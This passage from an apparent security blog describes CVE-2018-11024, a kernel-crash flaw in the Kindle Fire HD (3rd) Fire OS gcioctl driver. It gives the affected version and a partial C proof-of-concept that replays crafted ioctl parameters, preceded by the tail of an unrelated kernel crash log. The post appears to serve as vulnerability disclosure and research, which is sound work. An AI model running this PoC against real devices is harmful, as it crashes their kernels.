exception</span><br><span class="line">[18461.546173] CPU1: stopping</span><br><span class="line">[18461.549285] Backtrace: </span><br><span class="line">[18461.552459] [&lt;c0018148&gt;] (dump_backtrace+0x0&#x2F;0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18&#x2F;0x1c)</span><br><span class="line">[18461.561828]  r6:c09ddc50 r5:c09dc844 r4:00000001 r3:c0a0e950</span><br><span class="line">[18461.568969] [&lt;c0698ba0&gt;] (dump_stack+0x0&#x2F;0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190&#x2F;0x1c4)</span><br><span class="line">[18461.578185] [&lt;c0019a48&gt;] (handle_IPI+0x0&#x2F;0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58&#x2F;0x60)</span><br><span class="line">[18461.587554] [&lt;c00084a4&gt;] (gic_handle_irq+0x0&#x2F;0x60) from [&lt;c06a5540&gt;] (__irq_usr+0x40&#x2F;0x60)</span><br><span class="line">[18461.596862] Exception stack(0xc8967fb0 to 0xc8967ff8)</span><br><span class="line">[18461.602691] 7fa0:                                     404143ed 4041294b 00000054 000012f0</span><br><span class="line">[18461.611755] 7fc0: 4028cdb4 4040e438 0000012f 4041294b 4040d148 404111d8 beb9c2e0 404275c0</span><br><span class="line">[18461.620971] 7fe0: 40416bef beb9c1f0 4009d01f 400a0ec0 000f0010 ffffffff</span><br><span class="line">[18461.628478]  r6:ffffffff r5:000f0010 r4:400a0ec0 r3:404143ed</span><br><span class="line">[18461.635559] CPU0 PC (0) : 0xc003ee38</span><br><span class="line">[18461.639617] CPU0 PC (1) : 0xc003ee54</span><br><span class="line">[18461.643798] CPU0 PC (2) : 0xc003ee54</span><br><span class="line">[18461.647857] CPU0 PC (3) : 0xc003ee54</span><br><span class="line">[18461.651916] CPU0 PC (4) : 0xc003ee54</span><br><span class="line">[18461.656097] CPU0 PC (5) : 0xc003ee54</span><br><span class="line">[18461.660156] CPU0 PC (6) : 0xc003ee54</span><br><span class="line">[18461.664215] CPU0 PC (7) : 0xc003ee54</span><br><span class="line">[18461.668395] CPU0 PC (8) : 0xc003ee54</span><br><span class="line">[18461.672454] CPU0 PC (9) : 0xc003ee54</span><br><span class="line">[18461.676513] CPU1 PC (0) : 0xc0019b2c</span><br><span class="line">[18461.680694] CPU1 PC (1) : 0xc0019b2c</span><br><span class="line">[18461.684753] CPU1 PC (2) : 0xc0019b2c</span><br><span class="line">[18461.688812] CPU1 PC (3) : 0xc0019b2c</span><br><span class="line">[18461.692871] CPU1 PC (4) : 0xc0019b2c</span><br><span class="line">[18461.697051] CPU1 PC (5) : 0xc0019b2c</span><br><span class="line">[18461.701110] CPU1 PC (6) : 0xc0019b2c</span><br><span class="line">[18461.705169] CPU1 PC (7) : 0xc0019b2c</span><br><span class="line">[18461.709381] CPU1 PC (8) : 0xc0019b2c</span><br><span class="line">[18461.713409] CPU1 PC (9) : 0xc0019b2c</span><br><span class="line">[18461.717498] </span><br><span class="line">[18461.719268] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017</span><br><span class="line">[18461.719299] </span><br></pre></td></tr></table></figure>
</blockquote>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2020-09-12T15:13:01.000Z" title="2020-09-12T15:13:01.000Z">2020-09-12</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-09-12T15:19:36.946Z" title="2020-09-12T15:19:36.946Z">2020-09-12</time></span><span class="level-item"><a class="link-muted" href="/categories/IOT/">IOT</a></span><span class="level-item">19 minutes read (About 2862 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11024%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/">（CVE-2018-11024）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞</a></h1><div class="content"><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
<p>Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3的内核组件中的内核模块/omap/drivers/misc/gcx/gcioctl/gcif.c允许攻击者通过设备/ dev上ioctl的参数注入特制参数/ gcioctl使用命令1077435789并导致内核崩溃。</p>
</blockquote>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Fire OS 4.5.5.3</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>poc</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;	  //strlen</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt; //inet_addr</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;	  //write</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Socket boilerplate code taken from here: http://www.binarytides.com/server-client-example-c-sockets-linux/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> seed, ioctl_id, num_mappings, num_blobs, dev_name_len, dev_name, map_entry_t_arr, blobs</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">int</span> debug = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> src_id;</span><br><span class="line">	<span class="keyword">int</span> dst_id;</span><br><span class="line">	<span class="keyword">int</span> offset;</span><br><span class="line">&#125; <span class="keyword">map_entry_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">short</span> tiny_vals[<span class="number">18</span>] = &#123;<span class="number">128</span>, <span class="number">127</span>, <span class="number">64</span>, <span class="number">63</span>, <span class="number">32</span>, <span class="number">31</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">256</span>, <span class="number">255</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> *small_vals;</span><br><span class="line"><span class="keyword">int</span> num_small_vals;</span><br><span class="line"></span><br><span class="line"><span class="comment">// populates small_vals when called</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">populate_arrs</span><span class="params">(<span class="keyword">int</span> top)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> num = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (num &lt; top) &#123;</span><br><span class="line">		<span class="comment">//printf(&quot;%d\n&quot;, num);</span></span><br><span class="line">		num &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">		count += <span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// top</span></span><br><span class="line">	count += <span class="number">1</span>;</span><br><span class="line">	<span class="comment">// -1</span></span><br><span class="line">	count += <span class="number">1</span>;</span><br><span class="line">	num_small_vals = count;</span><br><span class="line">	num &gt;&gt;= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	small_vals = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*count);</span><br><span class="line">	<span class="built_in">memset</span>(small_vals, <span class="number">0</span>, count);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(num &gt; <span class="number">1</span>) &#123;</span><br><span class="line">		small_vals[i] = num;</span><br><span class="line">		i++;</span><br><span class="line">		small_vals[i] = num<span class="number">-1</span>;</span><br><span class="line">		i++;</span><br><span class="line">		num &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	small_vals[i] = <span class="number">0</span>;</span><br><span class="line">	small_vals[i+<span class="number">1</span>] = top;</span><br><span class="line">	small_vals[i+<span class="number">2</span>] = top<span class="number">-1</span>;</span><br><span class="line">	small_vals[i+<span class="number">3</span>] = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// generate a random value of size size and store it in elem.</span></span><br><span class="line"><span class="comment">// value has a weight % chance to be a &quot;small value&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gen_rand_val</span><span class="params">(<span class="keyword">int</span> size, <span class="keyword">char</span> *elem,  <span class="keyword">int</span> small_weight)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((rand() % <span class="number">100</span>) &lt; small_weight) &#123;</span><br><span class="line">		<span class="comment">// do small thing</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> idx = (rand() % num_small_vals);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Choosing %d\n&quot;</span>, small_vals[idx]);</span><br><span class="line">		<span class="keyword">switch</span> (size) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				idx = (rand() % <span class="number">18</span>);</span><br><span class="line">				*(<span class="keyword">short</span> *)elem = tiny_vals[idx];</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">				*(<span class="keyword">int</span> *)elem = small_vals[idx];</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">				*(<span class="keyword">long</span> <span class="keyword">long</span>*)elem = small_vals[idx];</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;Damn bro. Size: %d\n&quot;</span>, size);</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">			elem[i] = (<span class="keyword">char</span>)(rand()%<span class="number">0x100</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> num_blobs = <span class="number">0</span>, num_mappings = <span class="number">0</span>, i = <span class="number">0</span>, dev_name_len = <span class="number">0</span>, j;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> ioctl_id = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> *dev_name;</span><br><span class="line">	<span class="keyword">void</span> *tmp;</span><br><span class="line">	<span class="keyword">char</span> **ptr_arr;</span><br><span class="line">	<span class="keyword">int</span> *len_arr;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> seed;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> sockfd , client_sock , c , read_size;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span> , <span class="title">client</span>;</span></span><br><span class="line">	<span class="keyword">int</span> msg_size;</span><br><span class="line">	<span class="keyword">void</span> *generic_arr[<span class="number">264</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// max val for small_vals array</span></span><br><span class="line">	<span class="keyword">int</span> top = <span class="number">8192</span>;</span><br><span class="line">	<span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// chance that our generics are filled with &quot;small vals&quot;</span></span><br><span class="line">	<span class="keyword">int</span> default_weight = <span class="number">50</span>;</span><br><span class="line">	populate_arrs(top);</span><br><span class="line">	<span class="keyword">int</span> retest = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">goto</span> rerun;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	sockfd = socket(AF_INET , SOCK_STREAM , <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (sockfd == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Could not create socket&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Socket created&quot;</span>);</span><br><span class="line"></span><br><span class="line">	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;(<span class="keyword">int</span>)&#123; <span class="number">1</span> &#125;, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">	 </span><br><span class="line">	server.sin_family = AF_INET;</span><br><span class="line">	server.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">	server.sin_port = htons(atoi(argv[<span class="number">1</span>]));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Bind</span></span><br><span class="line">	<span class="keyword">if</span>( bind(sockfd,(struct sockaddr *)&amp;server , <span class="keyword">sizeof</span>(server)) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//print the error message</span></span><br><span class="line">		perror(<span class="string">&quot;bind failed. Error&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;bind done&quot;</span>);</span><br><span class="line">listen:	 </span><br><span class="line">	<span class="comment">// Listen</span></span><br><span class="line">	listen(sockfd , <span class="number">3</span>);</span><br><span class="line">	 </span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Waiting for incoming connections...&quot;</span>);</span><br><span class="line">	c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">	 </span><br><span class="line">	<span class="comment">// accept connection from an incoming client</span></span><br><span class="line">	client_sock = accept(sockfd, (struct sockaddr *)&amp;client, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line">	<span class="keyword">if</span> (client_sock &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(<span class="string">&quot;accept failed&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Connection accepted&quot;</span>);</span><br><span class="line">	 </span><br><span class="line">	msg_size = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// Receive a message from client</span></span><br><span class="line">	<span class="keyword">while</span>( (read_size = recv(client_sock , &amp;msg_size , <span class="number">4</span> , <span class="number">0</span>)) &gt; <span class="number">0</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// recv the entire message</span></span><br><span class="line">		<span class="keyword">char</span> *recv_buf = <span class="built_in">calloc</span>(msg_size, <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">		<span class="keyword">if</span> (recv_buf == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Failed to allocate recv_buf\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">int</span> nrecvd = recv(client_sock, recv_buf, msg_size, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (nrecvd != msg_size) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Error getting all data!\n&quot;</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;nrecvd: %d\nmsg_size:%d\n&quot;</span>, nrecvd, msg_size);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// quickly save a copy of the most recent data</span></span><br><span class="line">		<span class="keyword">int</span> savefd = open(<span class="string">&quot;/sdcard/saved&quot;</span>, O_WRONLY|O_TRUNC|O_CREAT, <span class="number">0644</span>);</span><br><span class="line">		<span class="keyword">if</span> (savefd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			perror(<span class="string">&quot;open saved&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">int</span> err = write(savefd, recv_buf, msg_size);</span><br><span class="line">		<span class="keyword">if</span> (err != msg_size) &#123;</span><br><span class="line">			perror(<span class="string">&quot;write saved&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		fsync(savefd);</span><br><span class="line">		close(savefd);</span><br><span class="line">rerun:</span><br><span class="line">		<span class="keyword">if</span> (retest) &#123;</span><br><span class="line">			recv_buf = <span class="built_in">calloc</span>(msg_size, <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">			<span class="keyword">int</span> fd = open(<span class="string">&quot;/sdcard/saved&quot;</span>, O_RDONLY);</span><br><span class="line">			<span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">				perror(<span class="string">&quot;open:&quot;</span>);</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">int</span> fsize = lseek(fd, <span class="number">0</span>, SEEK_END);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;file size: %d\n&quot;</span>, fsize);</span><br><span class="line">			lseek(fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">			read(fd, recv_buf, fsize);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">char</span> *head = recv_buf;</span><br><span class="line">		seed = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">//seed, ioctl_id, num_mappings, num_blobs, dev_name_len, dev_name, map_entry_t_arr, blob_len_arr, blobs</span></span><br><span class="line">		<span class="built_in">memcpy</span>(&amp;seed, head, <span class="number">4</span>);</span><br><span class="line">		head += <span class="number">4</span>;</span><br><span class="line">		<span class="built_in">memcpy</span>(&amp;ioctl_id, head, <span class="number">4</span>);</span><br><span class="line">		head += <span class="number">4</span>;</span><br><span class="line">		<span class="built_in">memcpy</span>(&amp;num_mappings, head, <span class="number">4</span>);</span><br><span class="line">		head += <span class="number">4</span>;</span><br><span class="line">		<span class="built_in">memcpy</span>(&amp;num_blobs, head, <span class="number">4</span>);</span><br><span class="line">		head += <span class="number">4</span>;</span><br><span class="line">		